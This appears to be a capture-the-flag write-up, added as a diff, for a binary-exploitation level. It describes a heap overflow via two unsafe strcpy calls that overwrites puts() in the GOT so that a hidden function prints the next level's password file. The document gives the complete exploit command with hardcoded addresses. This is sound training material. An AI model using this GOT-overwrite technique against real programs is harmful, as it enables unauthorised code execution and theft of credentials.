@@ -1,0 +1,19 @@
+See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.
+
+In this level, we have a program that takes two parameters which are both used in an unsafe way by strcpy.
+
+We will use an heap overflow on the first strcpy to modify the address of the buffer called by the 2nd strcpy to the address of the puts() function on the GOT table.
+
+doing so allows us to write directly on the GOT table with the strcpy and we use that to replace the address of puts by the address of m() an unused function which prints a buffer 'c' who is filled by content of the FD retrieved by:
+
+fd = fopen("/home/user/level8/.pass", "r");
+
+before the puts function is normally called.
+
+The exploit is built like this:
+
+argv[1] -> 20 characters padding + address of puts in the GOT table
+argv[2] -> address of the m() function
+
+./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
